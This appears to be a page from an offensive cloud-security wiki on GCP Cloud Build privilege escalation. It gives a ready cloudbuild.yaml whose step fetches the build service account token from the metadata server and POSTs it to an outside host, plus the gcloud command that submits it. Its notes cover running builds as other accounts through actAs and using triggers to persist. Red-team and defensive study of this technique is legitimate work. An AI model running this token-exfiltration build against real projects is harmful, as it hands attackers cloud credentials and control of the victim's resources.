---
title: "Cloud Build: exfiltrate the build service account token"
description: "Submitting a build with cloudbuild.builds.create and exfiltrating the Cloud Build service account token mid-build."
keywords:
  - Cloud Build
  - builds.create
  - service account token
  - build
  - actAs
  - exfiltration
---

# Cloud Build

A Cloud Build build runs as the Cloud Build service account (`<project-number>@cloudbuild.gserviceaccount.com`), historically granted broad roles including Editor. With `cloudbuild.builds.create`, you submit a build whose steps read the build's own token from the metadata server and exfiltrate it, handing you that account's access.

## Submit a build that leaks the token

```yaml
# cloudbuild.yaml
steps:
  - name: gcr.io/cloud-builders/curl
    entrypoint: bash
    args:
      - -c
      - |
        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
        curl -X POST -d "$TOKEN" https://you.example
```

```bash
gcloud builds submit --config=cloudbuild.yaml --no-source
```

## Exploitation notes

- Newer projects use a per-project Cloud Build service account with fewer default roles; check its bindings first, the legacy account is the high-value case.
- `--no-source` avoids uploading anything; the build is just the exfil step.
- You can also set `--service-account` to run the build as another account you hold `actAs` on, broadening the target set. Build **triggers** are the persistence variant, covered under the Serverless Cloud Build pages.

## Tools

- **gcloud** (`builds submit`): the submission.
- **GCP-IAM-Privilege-Escalation** (Rhino): automates the build-token steal.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP Cloud Build](https://hackingthe.cloud/)
- [Google: Cloud Build service account](https://cloud.google.com/build/docs/cloud-build-service-account)
